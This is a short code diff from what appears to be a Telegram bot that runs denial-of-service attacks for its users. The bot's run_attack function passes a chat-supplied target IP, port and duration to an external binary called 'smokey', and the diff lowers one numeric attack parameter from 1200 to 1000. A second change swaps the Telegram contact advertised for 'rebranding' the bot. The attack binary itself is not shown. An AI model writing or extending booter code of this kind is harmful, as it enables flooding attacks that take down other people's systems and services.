@@ -72,7 +72,7 @@ def run_attack_thread(chat_id, ip, port, duration):
 async def run_attack(chat_id, ip, port, duration):
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./smokey {ip} {port} {duration} 1200",
+            f"./smokey {ip} {port} {duration} 1000",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
         )
@@ -100,7 +100,7 @@ def welcome_start(message):
     )
     bot.send_message(
             message.chat.id,
-            f".\n➤    [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/MARSHALOP)   ᯓᡣ𐭩\n.\n",
+            f".\n➤    [➖𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚➖](https://t.me/MrinMoYxCB)   ᯓᡣ𐭩\n.\n",
     parse_mode="Markdown",
     disable_web_page_preview=True  # This disables the link preview
     )
